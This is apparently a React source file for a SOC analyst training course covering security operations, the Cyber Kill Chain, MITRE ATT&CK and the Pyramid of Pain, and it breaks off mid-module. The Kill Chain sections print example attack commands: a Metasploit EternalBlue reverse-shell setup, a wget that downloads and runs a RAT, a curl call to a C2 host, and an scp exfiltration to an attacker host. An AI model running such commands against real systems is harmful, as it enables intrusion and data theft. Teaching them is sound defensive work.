import React, { useState, useEffect } from 'react';
import { Book, ArrowLeft, ChevronDown, ChevronRight, Check } from 'lucide-react';
import { Link } from 'react-router-dom';
import Navigation from "../../components/Navigation";

function SocAnalystCourse() {
  // New course structure based on your syllabus.
  // Each module contains sections (with title and summary) and a quiz.
  const course = [
    {
      id: "module1",
      title: "Security Operations",
      sections: [
        {
          title: "Preparation and Prevention",
          summary: (
            <>
              <p><strong>Introduction to Preparation and Prevention</strong></p>
              <p>
                Before any incident occurs, a well-prepared Security Operations Center (SOC) is essential to minimize risk and reduce response time. Preparation and prevention encompass the establishment of policies, implementation of security controls, regular training, and proactive threat hunting. The goal is to reduce vulnerabilities and create layers of defense that deter, detect, and mitigate potential attacks.
              </p>
              <p>
                <strong>Key Areas of Focus:</strong>
              </p>
              <ul>
                <li>
                  <strong>Policy and Procedure Development:</strong> Establish incident response plans, escalation procedures, and clear communication channels. Define roles and responsibilities so every team member knows their role during an incident.
                </li>
                <li>
                  <strong>Threat Intelligence:</strong> Integrate threat intelligence feeds to stay informed about emerging threats and vulnerabilities. Regularly update detection rules and adjust defenses based on current threat landscapes.
                </li>
                <li>
                  <strong>Security Controls and Hardening:</strong> Implement firewalls, IDS/IPS systems, endpoint security solutions, and other technical measures. Maintain regular patch management and vulnerability scanning to reduce the attack surface.
                </li>
                <li>
                  <strong>Training and Simulation:</strong> Conduct regular training sessions, phishing simulations, and tabletop exercises. These drills prepare staff for real incidents, ensuring that they respond swiftly and correctly.
                </li>
              </ul>
              <p>
                <strong>Examples and Best Practices:</strong>
              </p>
              <p>
                For example, a SOC might schedule monthly vulnerability scans using tools like Nessus or OpenVAS. Findings are prioritized based on risk and remediated via a ticketing system. In parallel, regular threat intelligence briefings update the SIEM detection rules. A sample SIEM rule might be:
              </p>
              <pre>{`IF event.type == "login_failure" AND event.count > 5 WITHIN 10 minutes THEN alert "Potential brute force attack"`}</pre>
              <p>
                Additionally, a phishing simulation campaign may be launched where employees receive fake phishing emails. The results are analyzed to identify weaknesses in training and awareness.
              </p>
              <p>
                Preparation is an ongoing process. Regular reviews of policies, continuous threat intelligence updates, and iterative testing ensure the SOC remains effective against evolving threats.
              </p>
            </>
          )
        },
        {
          title: "Monitoring and Investigation",
          summary: (
            <>
              <p><strong>Continuous Monitoring and Alerting</strong></p>
              <p>
                A core function of a SOC is continuous monitoring. Using Security Information and Event Management (SIEM) systems, analysts collect and correlate logs from diverse sources such as network devices, servers, endpoints, and applications. This real-time monitoring enables the detection of anomalies and potential security incidents as they occur.
              </p>
              <p>
                <strong>Key Monitoring Techniques:</strong>
              </p>
              <ul>
                <li>
                  <strong>Log Collection and Correlation:</strong> Aggregating logs from firewalls, IDS/IPS, endpoints, and application servers to build a comprehensive view of network activity.
                </li>
                <li>
                  <strong>Alert Prioritization:</strong> Using correlation rules and threat intelligence to filter false positives and prioritize alerts by severity.
                </li>
                <li>
                  <strong>Dashboards and Reporting:</strong> Implementing visual dashboards to monitor security metrics and incident trends at a glance.
                </li>
              </ul>
              <p>
                <strong>The Investigation Process:</strong>
              </p>
              <ul>
                <li>
                  <strong>Event Analysis:</strong> Examine log entries, timestamps, and network flows to reconstruct the sequence of events.
                </li>
                <li>
                  <strong>Threat Hunting:</strong> Proactively search for hidden indicators of compromise using tools like Splunk or the ELK stack.
                </li>
                <li>
                  <strong>Incident Correlation:</strong> Link related events across different systems to identify broader attack patterns.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <p>
                An analyst might receive an alert about multiple failed login attempts from a single IP. They could run a Splunk query like:
              </p>
              <pre>{`index=security sourcetype=auth_logs "login failure" | stats count by src_ip`}</pre>
              <p>
                This query helps detect potential brute force attacks. Further, if unusual outbound traffic is detected, an analyst might capture packet data using Wireshark to determine if data exfiltration is occurring.
              </p>
              <p>
                Monitoring and investigation are iterative processes. Each incident provides valuable feedback to refine detection rules and improve overall response strategies.
              </p>
            </>
          )
        },
        {
          title: "A Day In the Life SOC",
          summary: (
            <>
              <p><strong>A Typical Day for a SOC Analyst</strong></p>
              <p>
                The daily routine of a SOC analyst is dynamic, demanding constant vigilance and rapid response to evolving threats. While each day may present unique challenges, a typical day involves a combination of monitoring, investigation, collaboration, and continuous learning.
              </p>
              <p>
                <strong>Morning Briefing and Handoff:</strong>
              </p>
              <p>
                The day begins with a morning briefing, where the outgoing shift provides a detailed handoff covering overnight incidents, active alerts, and ongoing investigations. This briefing ensures that every team member is aware of the current threat landscape and priorities.
              </p>
              <p>
                <strong>Start-of-Shift Activities:</strong>
              </p>
              <ul>
                <li>Log into the SIEM dashboard to review current alerts and system statuses.</li>
                <li>Check emails and incident reports for escalations or updates.</li>
                <li>Verify that all monitoring systems (firewalls, IDS/IPS, endpoint tools) are functioning correctly.</li>
              </ul>
              <p>
                <strong>Midday: Triage, Analysis, and Investigation</strong>
              </p>
              <p>
                As the day progresses, SOC analysts actively monitor alerts. A high-priority alert—such as unusual outbound traffic—may trigger a detailed investigation. Analysts will analyze log data, use tools like Wireshark for packet captures, and run Splunk queries such as:
              </p>
              <pre>{`# Example Splunk query to identify high traffic volumes
  index=network sourcetype=netflow 
  | stats sum(bytes) as total_bytes by src_ip, dest_ip 
  | where total_bytes > 100000000`}</pre>
              <p>
                This query helps pinpoint potential data exfiltration or DDoS attacks. Collaborative efforts with incident response teams help determine if the incident is part of a broader attack.
              </p>
              <p>
                <strong>Afternoon: Collaboration and Documentation</strong>
              </p>
              <p>
                Throughout the day, analysts communicate with team members, participate in briefings, and update incident documentation. Detailed incident reports are created for every confirmed threat, capturing the timeline, actions taken, and lessons learned.
              </p>
              <p>
                <strong>End-of-Shift and Handoff:</strong>
              </p>
              <p>
                As the shift nears its end, analysts compile a comprehensive handoff report summarizing incidents, investigations, and actions taken during the day. This ensures a smooth transition to the incoming team and continuity in threat monitoring.
              </p>
              <p>
                <strong>Real-World Example:</strong> In one day, an analyst might handle a phishing campaign alert, investigate lateral movement within the network, and document a potential data exfiltration incident. Their findings and actions are then shared with the next shift to maintain situational awareness.
              </p>
              <p>
                A day in the life of a SOC analyst is both challenging and rewarding. Continuous learning, team collaboration, and adapting to new threats are essential components of a successful SOC operation.
              </p>
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "What does SOC stand for?",
            options: [
              "Security Operations Center",
              "System Operations Center",
              "Security Optimization Center",
              "System Optimization Center"
            ],
            correctAnswer: "Security Operations Center"
          }
        ]
      }
    },
    {
      id: "module2",
      title: "Cyber Kill Chain",
      sections: [
        {
          title: "Introduction",
          summary: (
            <>
              <p>
                <strong>Understanding the Cyber Kill Chain</strong>
              </p>
              <p>
                The Cyber Kill Chain is a model developed by Lockheed Martin to describe the stages of a cyber attack. It outlines the step-by-step process that adversaries follow, from initial reconnaissance to achieving their objectives. By understanding each stage, organizations can develop strategies to detect, disrupt, and ultimately defend against advanced persistent threats.
              </p>
              <p>
                The model is widely used in cybersecurity as it provides a structured way to analyze attacks and implement defensive measures. It emphasizes that attackers must successfully complete each stage before achieving their final objective, making it possible to interdict the attack at multiple points along the chain.
              </p>
              <p>
                <strong>Key Benefits of the Cyber Kill Chain:</strong>
              </p>
              <ul>
                <li>Provides a clear, step-by-step framework for understanding cyber attacks.</li>
                <li>Helps security teams identify and disrupt attacks at various stages.</li>
                <li>Facilitates communication and collaboration between incident response teams.</li>
                <li>Drives the development of proactive defense measures and threat intelligence.</li>
              </ul>
              <p>
                <strong>Example:</strong> Consider an attacker planning a data breach. If defenders can disrupt the attack during the reconnaissance or delivery phase, the attacker may never reach the exploitation and installation stages. This layered defense approach is at the heart of the Cyber Kill Chain model.
              </p>
              <p>
                In this course, we will explore each stage of the Cyber Kill Chain in detail, providing practical examples, tools, and strategies to help you understand how to detect and prevent attacks.
              </p>
            </>
          )
        },
        {
          title: "Reconnaissance",
          summary: (
            <>
              <p>
                <strong>Gathering Intelligence on the Target</strong>
              </p>
              <p>
                Reconnaissance is the first stage of the Cyber Kill Chain, where attackers collect as much information as possible about their target. This phase is all about gathering intelligence to plan the subsequent stages of the attack.
              </p>
              <p>
                <strong>Techniques Used in Reconnaissance:</strong>
              </p>
              <ul>
                <li>
                  <strong>Open Source Intelligence (OSINT):</strong> Using publicly available information, such as social media, company websites, and public records, to gather details about the target.
                </li>
                <li>
                  <strong>Network Scanning:</strong> Tools like Nmap are used to identify live hosts, open ports, and services running on the target network.
                  <br /><code>{`nmap -A target-ip`}</code>
                </li>
                <li>
                  <strong>Web Footprinting:</strong> Analyzing a target’s online presence to gather domain information, server details, and potential vulnerabilities.
                </li>
                <li>
                  <strong>Social Engineering:</strong> Researching employee profiles on social media or professional networks to identify potential entry points.
                </li>
              </ul>
              <p>
                <strong>Example Scenario:</strong> An attacker uses a tool like Shodan to search for publicly accessible devices with default credentials. Combined with OSINT techniques, the attacker builds a profile of the target’s network infrastructure and personnel.
              </p>
              <p>
                Effective reconnaissance not only helps the attacker refine their strategy but also provides defenders with the opportunity to identify exposed assets and tighten security measures.
              </p>
            </>
          )
        },
        {
          title: "Weaponization",
          summary: (
            <>
              <p>
                <strong>Crafting the Attack Payload</strong>
              </p>
              <p>
                Weaponization is the stage where the attacker prepares the malicious payload by coupling it with an exploit. This phase involves taking the information gathered during reconnaissance and using it to develop a weapon that can breach the target’s defenses.
              </p>
              <p>
                <strong>Key Processes in Weaponization:</strong>
              </p>
              <ul>
                <li>
                  <strong>Exploit Development:</strong> Creating or selecting an exploit that takes advantage of a known vulnerability in the target system.
                </li>
                <li>
                  <strong>Payload Creation:</strong> Generating the malicious code (e.g., malware, ransomware, backdoor) that will be executed on the target system.
                </li>
                <li>
                  <strong>Coupling Exploit and Payload:</strong> Tools like Metasploit allow attackers to combine exploits with payloads. For example:
                  <br /><code>{`use exploit/windows/smb/ms17_010_eternalblue`}</code>
                  <br /><code>{`set PAYLOAD windows/x64/meterpreter/reverse_tcp`}</code>
                </li>
              </ul>
              <p>
                <strong>Example:</strong> An attacker might weaponize a phishing email by embedding a malicious document that exploits a zero-day vulnerability in a popular PDF reader. When the target opens the document, the payload executes and establishes a foothold in the system.
              </p>
              <p>
                The success of this stage depends on the attacker’s ability to accurately match the payload with the discovered vulnerabilities and bypass security controls.
              </p>
            </>
          )
        },
        {
          title: "Delivery",
          summary: (
            <>
              <p>
                <strong>Transmitting the Malicious Payload</strong>
              </p>
              <p>
                Delivery is the phase in which the weaponized payload is transmitted to the target. The attacker chooses a delivery method based on the target's vulnerabilities and the information gathered during reconnaissance.
              </p>
              <p>
                <strong>Common Delivery Methods:</strong>
              </p>
              <ul>
                <li>
                  <strong>Phishing Emails:</strong> Crafting emails that appear legitimate to lure targets into opening malicious attachments or clicking on harmful links.
                </li>
                <li>
                  <strong>Drive-by Downloads:</strong> Hosting malicious code on compromised or malicious websites that automatically download malware when visited.
                </li>
                <li>
                  <strong>Removable Media:</strong> Using USB drives or other physical media to deliver malware. For example, leaving a USB drive labeled “Confidential” in a public area.
                </li>
                <li>
                  <strong>Exploiting Web Applications:</strong> Injecting malicious code into vulnerable websites or exploiting insecure file upload functionalities.
                </li>
              </ul>
              <p>
                <strong>Example:</strong> A spear phishing email might be sent to a company’s finance department with a subject like “Urgent Invoice Update.” The email includes a malicious attachment that, once opened, triggers the execution of the payload.
              </p>
              <p>
                The delivery method is crucial because it must bypass security filters, avoid detection, and successfully reach the target system.
              </p>
            </>
          )
        },
        {
          title: "Exploitation",
          summary: (
            <>
              <p>
                <strong>Triggering the Malicious Code</strong>
              </p>
              <p>
                Exploitation is the phase where the payload, once delivered, takes advantage of a vulnerability to execute on the target system. This stage is where the actual breach occurs, and unauthorized access is gained.
              </p>
              <p>
                <strong>Exploitation Techniques:</strong>
              </p>
              <ul>
                <li>
                  <strong>Buffer Overflows:</strong> Exploiting a software bug where more data is written to a buffer than it can hold, allowing the attacker to execute arbitrary code.
                </li>
                <li>
                  <strong>Code Injection:</strong> Injecting malicious code into an application through unsanitized input fields.
                </li>
                <li>
                  <strong>Privilege Escalation:</strong> Exploiting vulnerabilities to gain higher-level privileges on a system.
                </li>
                <li>
                  <strong>Zero-Day Exploits:</strong> Taking advantage of vulnerabilities that are unknown to the vendor, leaving no patch available.
                </li>
              </ul>
              <p>
                <strong>Example:</strong> A common scenario is when an attacker sends a phishing email with a malicious attachment. When the target opens the file, an exploit is triggered that takes advantage of an unpatched vulnerability in the document viewer, thereby granting the attacker remote access.
              </p>
              <p>
                Exploitation requires a precise match between the payload and the vulnerability. The more specific the exploit, the harder it is to defend against.
              </p>
            </>
          )
        },
        {
          title: "Installation",
          summary: (
            <>
              <p>
                <strong>Establishing Persistence on the Target System</strong>
              </p>
              <p>
                After successful exploitation, the attacker aims to install malware or backdoors to maintain persistent access to the compromised system. The installation phase ensures that the attacker can return even if the initial vulnerability is patched.
              </p>
              <p>
                <strong>Key Installation Techniques:</strong>
              </p>
              <ul>
                <li>
                  <strong>Droppers and Downloaders:</strong> Tools that download and install additional malware components onto the target.
                </li>
                <li>
                  <strong>Rootkits:</strong> Software designed to hide the presence of malicious code and provide continued access.
                </li>
                <li>
                  <strong>Persistence Mechanisms:</strong> Modifying registry keys, scheduled tasks, or startup scripts to ensure that malware runs each time the system boots.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  A droplet might execute a script that downloads a remote access tool (RAT) from an attacker-controlled server:
                  <br /><code>{`wget http://malicious.example.com/rat.exe -O rat.exe && rat.exe`}</code>
                </li>
                <li>
                  A rootkit might modify system files to remain hidden from antivirus software.
                </li>
              </ul>
              <p>
                The installation phase is critical because it sets up the attacker’s foothold and enables long-term control over the compromised system.
              </p>
            </>
          )
        },
        {
          title: "Command & Control",
          summary: (
            <>
              <p>
                <strong>Establishing Communication with the Attacker</strong>
              </p>
              <p>
                The Command & Control (C2) stage is where the attacker establishes a communication channel with the compromised system. This channel is used to send commands, update payloads, and exfiltrate data.
              </p>
              <p>
                <strong>Key Components of C2 Infrastructure:</strong>
              </p>
              <ul>
                <li>
                  <strong>C2 Servers:</strong> The remote servers controlled by the attacker, which issue commands and receive data from the compromised host.
                </li>
                <li>
                  <strong>Communication Protocols:</strong> Commonly used protocols include HTTP/HTTPS, DNS tunneling, and custom protocols that can bypass firewalls.
                </li>
                <li>
                  <strong>Stealth Techniques:</strong> Methods like domain fluxing, fast-flux DNS, and encrypted channels are used to evade detection.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  A compromised system might initiate a connection to a C2 server using HTTPS:
                  <br /><code>{`curl -X POST https://c2.example.com/command -d "id=1234&cmd=update"`}</code>
                </li>
                <li>
                  Attackers may use tools like Cobalt Strike to establish and manage C2 channels.
                </li>
              </ul>
              <p>
                Maintaining a robust C2 channel allows attackers to control the compromised system remotely, issue commands for further actions, and exfiltrate valuable data, making this stage a critical component of advanced persistent threats.
              </p>
            </>
          )
        },
        {
          title: "Actions on Objectives (Exfiltration)",
          summary: (
            <>
              <p>
                <strong>Achieving the Attacker's Goals</strong>
              </p>
              <p>
                The final stage of the Cyber Kill Chain is where the attacker achieves their objectives. These objectives may include data exfiltration, data destruction, system disruption, or espionage. Once the attacker has established persistence and communication, they begin to extract valuable data or execute destructive actions.
              </p>
              <p>
                <strong>Common Objectives:</strong>
              </p>
              <ul>
                <li>
                  <strong>Data Exfiltration:</strong> Stealing sensitive data such as intellectual property, financial records, or personal information. This can be done using encrypted channels or covert transfer protocols.
                </li>
                <li>
                  <strong>Data Destruction:</strong> Deleting or corrupting data to disrupt business operations or cover tracks.
                </li>
                <li>
                  <strong>Credential Harvesting:</strong> Extracting user credentials and other authentication tokens to enable further access.
                </li>
                <li>
                  <strong>System Disruption:</strong> Launching ransomware attacks or other forms of cyber sabotage.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  An attacker exfiltrates data using a command like:
                  <br /><code>{`tar -czf /tmp/data.tar.gz /sensitive_data && scp /tmp/data.tar.gz attacker@malicious.example.com:/exfil`}</code>
                </li>
                <li>
                  Another scenario involves deploying ransomware that encrypts files and demands payment for decryption.
                </li>
              </ul>
              <p>
                By understanding the final objectives of an attack, defenders can implement measures to detect unusual data transfers, monitor network traffic for signs of exfiltration, and employ data loss prevention (DLP) solutions to stop sensitive data from leaving the organization.
              </p>
              <p>
                In summary, the Actions on Objectives stage is where the attacker reaps the rewards of their efforts. Effective monitoring and prevention mechanisms at this stage can help organizations mitigate the impact of successful breaches.
              </p>
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "Which stage comes first in the Cyber Kill Chain?",
            options: [
              "Reconnaissance",
              "Delivery",
              "Exploitation",
              "Installation"
            ],
            correctAnswer: "Reconnaissance"
          }
        ]
      }
    },
    {
      id: "module3",
      title: "MITRE ATT&CK",
      sections: [
        {
          title: "What is the MITRE ATT&CK framework",
          summary: (
            <>
              <p>
                <strong>Overview</strong>
              </p>
              <p>
                The MITRE ATT&CK framework is a globally-accessible knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations. Developed by MITRE, it provides a comprehensive and structured taxonomy that describes the various stages of a cyber attack. This framework is used by security professionals to better understand how adversaries operate, to assess security posture, and to improve detection and response strategies.
              </p>
              <p>
                <strong>Key Components:</strong> The framework is divided into tactics (the “why” of an attack), techniques (the “how”), and procedures (detailed implementation methods). It spans various attack surfaces and includes a wealth of historical data and examples that can be used for threat hunting, incident response, and red teaming.
              </p>
              <p>
                <strong>Real-World Example:</strong> For instance, if an organization is experiencing unusual lateral movement in their network, an analyst can reference the MITRE ATT&CK framework to determine which techniques (such as "Pass the Hash" or "Remote File Copy") are commonly used for lateral movement. This contextual information can then guide the investigation and the deployment of specific countermeasures.
              </p>
              <p>
                Additionally, organizations use the framework to map their existing security controls against known adversary behaviors and identify gaps in their defenses.
              </p>
              <p>
                <strong>Code Snippet Example:</strong> In a SIEM system, you might tag events with MITRE ATT&CK IDs to correlate alerts:
              </p>
              <pre>{`# Pseudo-code example for tagging logs
    if event.description.contains("lateral movement"):
        event.tag = "T1021"  # T1021: Remote Services (Lateral Movement)
    `}</pre>
              <p>
                The MITRE ATT&CK framework has become an essential tool for modern cybersecurity, enabling organizations to take a proactive stance in understanding and mitigating threats.
              </p>
            </>
          )
        },
        {
          title: "MITRE ATT&CK Matrix",
          summary: (
            <>
              <p>
                <strong>The Structure of the ATT&CK Matrix</strong>
              </p>
              <p>
                The MITRE ATT&CK Matrix is a visual representation of the adversary tactics and techniques compiled in the ATT&CK framework. The matrix organizes tactics as columns and techniques as rows, allowing analysts to quickly see which techniques are used across different stages of an attack.
              </p>
              <p>
                <strong>How to Read the Matrix:</strong> Each cell in the matrix represents a technique used to achieve a particular tactical goal. For example, a cell might indicate that "Credential Dumping" is a technique under the "Credential Access" tactic.
              </p>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  <strong>Tactic:</strong> Initial Access  
                  <br /><strong>Technique:</strong> Spear Phishing (T1566)
                </li>
                <li>
                  <strong>Tactic:</strong> Lateral Movement  
                  <br /><strong>Technique:</strong> Remote Services (T1021)
                </li>
              </ul>
              <p>
                The matrix serves as a valuable reference for security teams. By mapping observed attack behaviors to the matrix, analysts can determine which areas of their defenses may require strengthening.
              </p>
              <p>
                <strong>Interactive Example:</strong> Some organizations use interactive dashboards where clicking on a tactic reveals detailed descriptions, mitigations, and real-world case studies of associated techniques.
              </p>
              <p>
                Overall, the ATT&CK Matrix provides a holistic view of the attack landscape, enabling more effective threat modeling and defense planning.
              </p>
            </>
          )
        },
        {
          title: "MITRE ATT&CK for Cloud Matrix",
          summary: (
            <>
              <p>
                <strong>Introduction to the Cloud Matrix</strong>
              </p>
              <p>
                As organizations increasingly migrate to cloud environments, the MITRE ATT&CK for Cloud Matrix was developed to address the unique tactics and techniques used by adversaries in cloud-based attacks. It complements the enterprise matrix by focusing on cloud-specific attack vectors.
              </p>
              <p>
                <strong>Key Components:</strong> The Cloud Matrix organizes cloud attack techniques under tactics tailored to cloud environments, such as “Resource Development” and “Initial Access” with cloud-specific nuances.
              </p>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  <strong>Initial Access:</strong> Techniques like "Valid Accounts" (T1078) are adapted for cloud scenarios where attackers may use stolen credentials to access cloud services.
                </li>
                <li>
                  <strong>Execution:</strong> Techniques that involve exploiting cloud management interfaces or misconfigured API gateways.
                </li>
              </ul>
              <p>
                Cloud environments require special attention due to their dynamic and scalable nature. The MITRE ATT&CK for Cloud Matrix helps organizations identify vulnerabilities in cloud configurations, enforce best practices, and detect anomalies that might indicate a breach.
              </p>
              <p>
                <strong>Real-World Example:</strong> An attacker might exploit a misconfigured AWS S3 bucket to exfiltrate sensitive data. Mapping this behavior to the cloud matrix enables security teams to quickly pinpoint the relevant tactics and techniques and deploy targeted countermeasures.
              </p>
              <p>
                The Cloud Matrix is a vital tool for any organization leveraging cloud services, ensuring that security measures are as dynamic and scalable as the environments they protect.
              </p>
            </>
          )
        },
        {
          title: "MITRE ATT&CK tactics",
          summary: (
            <>
              <p>
                <strong>Understanding Tactics in the ATT&CK Framework</strong>
              </p>
              <p>
                Tactics in the MITRE ATT&CK framework represent the adversary’s strategic objectives during an attack. They are the high-level goals that attackers aim to achieve, such as gaining initial access, maintaining persistence, and exfiltrating data.
              </p>
              <p>
                <strong>Common Tactics Include:</strong>
              </p>
              <ul>
                <li>
                  <strong>Initial Access:</strong> Techniques used to gain an initial foothold in the target environment (e.g., phishing, exploitation of vulnerabilities).
                </li>
                <li>
                  <strong>Execution:</strong> Methods by which attackers run malicious code on a target system.
                </li>
                <li>
                  <strong>Persistence:</strong> Strategies to maintain access over time, even if initial vulnerabilities are patched.
                </li>
                <li>
                  <strong>Privilege Escalation:</strong> Techniques used to gain higher-level permissions on a system.
                </li>
                <li>
                  <strong>Defense Evasion:</strong> Methods to avoid detection by security tools.
                </li>
                <li>
                  <strong>Credential Access:</strong> Techniques aimed at stealing authentication credentials.
                </li>
                <li>
                  <strong>Discovery:</strong> Actions taken to gather information about the target environment.
                </li>
                <li>
                  <strong>Lateral Movement:</strong> Techniques to move through the network after initial compromise.
                </li>
                <li>
                  <strong>Collection:</strong> Strategies to gather data of interest.
                </li>
                <li>
                  <strong>Exfiltration:</strong> Methods used to extract data from the target.
                </li>
                <li>
                  <strong>Impact:</strong> Actions intended to disrupt, degrade, or destroy systems.
                </li>
              </ul>
              <p>
                <strong>Example Scenario:</strong> An attacker might first use phishing to achieve initial access, then employ credential access techniques to steal passwords, followed by lateral movement to access critical systems, and finally exfiltrate data. Each of these steps corresponds to a distinct tactic in the framework.
              </p>
              <p>
                Understanding these tactics allows defenders to map observed behaviors to specific adversary objectives and to tailor their defensive strategies accordingly.
              </p>
            </>
          )
        },
        {
          title: "MITRE ATT&CK techniques",
          summary: (
            <>
              <p>
                <strong>Deep Dive into Techniques</strong>
              </p>
              <p>
                Techniques in the MITRE ATT&CK framework detail the specific methods used by adversaries to achieve each tactic. They provide granular insight into how attacks are executed, allowing security teams to develop precise detection and mitigation strategies.
              </p>
              <p>
                <strong>Examples of Techniques:</strong>
              </p>
              <ul>
                <li>
                  <strong>Phishing (T1566):</strong> A common technique under Initial Access, where attackers send deceptive emails to trick users into revealing sensitive information.
                </li>
                <li>
                  <strong>Credential Dumping (T1003):</strong> A technique under Credential Access that involves extracting account credentials from operating systems.
                </li>
                <li>
                  <strong>Process Injection (T1055):</strong> A technique under Defense Evasion that involves injecting malicious code into legitimate processes.
                </li>
                <li>
                  <strong>Lateral Tool Transfer (T1570):</strong> A technique used for Lateral Movement that involves transferring tools between systems to facilitate further compromise.
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> During an investigation, analysts may observe unusual network traffic associated with PowerShell commands. Mapping this activity to the "Process Injection" technique helps identify that an attacker is attempting to hide malicious code within legitimate processes.
              </p>
              <p>
                Organizations often use the detailed technique descriptions in the ATT&CK framework to build detection rules for SIEM systems, create threat hunting queries, and prioritize remediation efforts.
              </p>
            </>
          )
        },
        {
          title: "MITRE ATT&CK vs. the Cyber Kill Chain",
          summary: (
            <>
              <p>
                <strong>Comparing Two Prominent Models</strong>
              </p>
              <p>
                Both the MITRE ATT&CK framework and the Cyber Kill Chain are models used to understand and counter cyber attacks, but they differ in scope and approach. The Cyber Kill Chain, developed by Lockheed Martin, outlines a linear progression of an attack from reconnaissance to actions on objectives. In contrast, the MITRE ATT&CK framework offers a more granular and comprehensive taxonomy of adversary behaviors.
              </p>
              <p>
                <strong>Key Differences:</strong>
              </p>
              <ul>
                <li>
                  <strong>Linear vs. Comprehensive:</strong> The Cyber Kill Chain presents a linear, step-by-step process, whereas MITRE ATT&CK provides detailed tactics and techniques that cover a wider range of adversary behaviors.
                </li>
                <li>
                  <strong>Granularity:</strong> MITRE ATT&CK dives deeper into specific methods (techniques), while the Cyber Kill Chain focuses on broader phases of an attack.
                </li>
                <li>
                  <strong>Usage:</strong> The Cyber Kill Chain is useful for high-level analysis and incident response, whereas MITRE ATT&CK is widely used for threat modeling, detection engineering, and proactive threat hunting.
                </li>
              </ul>
              <p>
                <strong>Example:</strong> A defender may use the Cyber Kill Chain to quickly identify which phase an attack is in and interrupt it. Alternatively, they might use MITRE ATT&CK to fine-tune detection rules and correlate multiple indicators that suggest a specific technique, such as lateral movement via Remote Services (T1021).
              </p>
              <p>
                In summary, while both models are valuable, MITRE ATT&CK provides a more detailed and flexible approach, making it highly effective in modern threat detection and response.
              </p>
            </>
          )
        },
        {
          title: "How Do You Use the MITRE ATT&CK Matrix",
          summary: (
            <>
              <p>
                <strong>Applying the ATT&CK Matrix in Practice</strong>
              </p>
              <p>
                The MITRE ATT&CK Matrix is not only a reference tool but also a practical resource for enhancing an organization’s security posture. By mapping incidents, alerts, and security controls to the matrix, defenders can better understand adversary behaviors, identify gaps in defenses, and prioritize mitigation efforts.
              </p>
              <p>
                <strong>Steps to Utilize the Matrix:</strong>
              </p>
              <ol>
                <li>
                  <strong>Mapping Incidents:</strong> When an incident occurs, analysts map observed behaviors to corresponding tactics and techniques in the matrix. This helps in understanding the adversary’s approach and determining which areas of the network were targeted.
                </li>
                <li>
                  <strong>Detection Engineering:</strong> Use the matrix to develop and refine detection rules. For example, if multiple alerts correlate with a specific technique like “Process Injection” (T1055), analysts can fine-tune their SIEM queries to better detect similar activities.
                </li>
                <li>
                  <strong>Threat Hunting:</strong> Proactively search for indicators of compromise by using the matrix as a checklist of techniques that adversaries might use. This can involve writing queries in SIEM tools or using open-source threat intelligence feeds.
                </li>
                <li>
                  <strong>Gap Analysis and Mitigation:</strong> Assess current security controls against the matrix to identify which techniques are not adequately covered. Then, implement additional measures to mitigate these gaps.
                </li>
              </ol>
              <p>
                <strong>Example Usage:</strong> An organization might conduct a quarterly review of its security posture by mapping recent incidents to the ATT&CK Matrix. They discover that “Credential Access” techniques such as “Brute Force” (T1110) are under-monitored. As a result, they implement stronger password policies and deploy additional monitoring on authentication systems.
              </p>
              <p>
                <strong>Code Snippet Example:</strong> In a SIEM environment, an analyst could create a correlation rule such as:
              </p>
              <pre>{`if (event.technique == "T1055") {
      alert("Potential Process Injection detected");
    }`}</pre>
              <p>
                Ultimately, the ATT&CK Matrix is a dynamic tool that empowers security teams to improve detection, streamline incident response, and foster a culture of proactive threat hunting.
              </p>
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "What is the purpose of the MITRE ATT&CK framework?",
            options: [
              "To model adversary behavior",
              "To design firewalls",
              "To develop software",
              "To manage networks"
            ],
            correctAnswer: "To model adversary behavior"
          }
        ]
      }
    },
    {
      id: "module4",
      title: "Pyramid Of Pain",
      sections: [
        {
          title: "What is the Pyramid of Pain",
          summary: (
            <>
                          <img
                src="/Learning Paths/SOC/Pyramid.png"
                alt="Pyramid of Pain"
                className="my-4 w-full max-w-md mx-auto"
              />
              <p><strong>Introduction to the Pyramid of Pain</strong></p>
              <p>
                The Pyramid of Pain is a conceptual model that illustrates how different types of indicators, used in threat intelligence and cyber defense, vary in the level of difficulty they impose on adversaries. Developed by David J. Bianco, the pyramid demonstrates that not all indicators are equal—while some (like hash values) are easy for attackers to change, others (like Tactics, Techniques, and Procedures or TTPs) require significant effort to alter.
              </p>
              <p>
                The pyramid is structured in layers, with the simplest and most volatile indicators at the bottom and the hardest-to-change indicators at the top. As you move upward, the “pain” inflicted on an adversary increases when these indicators are disrupted or eliminated.
              </p>
              <p>
                <strong>Layers of the Pyramid:</strong>
              </p>
              <ul>
                <li><strong>Hash values:</strong> Easily changed file hashes.</li>
                <li><strong>IP addresses:</strong> Often transient, can be easily replaced.</li>
                <li><strong>Domain names:</strong> Important but can be re-registered.</li>
                <li><strong>Network Artifacts:</strong> Log data, protocol behaviors, etc.</li>
                <li><strong>Host Artifacts:</strong> System-level details like registry keys, file paths, or specific software versions.</li>
                <li><strong>Tools:</strong> Specific malware or hacking tools used by attackers.</li>
                <li><strong>Tactics, Techniques, and Procedures (TTPs):</strong> The most resilient and difficult-to-change elements that define how an adversary operates.</li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> If an organization focuses solely on indicators like hash values or IP addresses, an attacker can simply modify these attributes. However, if defenders focus on disrupting the adversary's TTPs, the attacker is forced to fundamentally change their operational approach, causing significant “pain” and disruption.
              </p>
              <p>
                The Pyramid of Pain encourages organizations to prioritize defensive measures that target the most strategic aspects of an attack, thereby maximizing the impact on adversaries.
              </p>
            </>
          )
        },
        {
          title: "Hash values",
          summary: (
            <>
              <p><strong>Understanding Hash Values as Indicators</strong></p>
              <p>
